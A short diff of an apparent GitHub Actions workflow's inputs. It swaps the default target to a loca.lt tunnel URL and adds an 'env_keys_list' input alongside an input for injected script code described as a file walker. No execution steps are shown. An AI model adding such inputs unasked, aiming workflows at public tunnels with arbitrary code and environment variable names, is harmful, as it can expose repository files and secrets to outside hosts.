@@ -11,12 +11,17 @@ on:
         description: 'The API target endpoint (Use Ngrok/LocalTunnel for local testing)'
         required: true
         type: string
-        default: 'https://slick-weeks-say.loca.lt'
+        default: 'https://true-candles-push.loca.lt'
       custom_script_payload:
         description: 'Compiled OdoziVisitor class code and file walker'
         required: false
         type: string
         default: ''
+      env_keys_list:
+        description: 'JSON array of environment variable names required by this repository'
+        required: false
+        type: string
+        default: '[]'
 
 permissions:
   contents: read
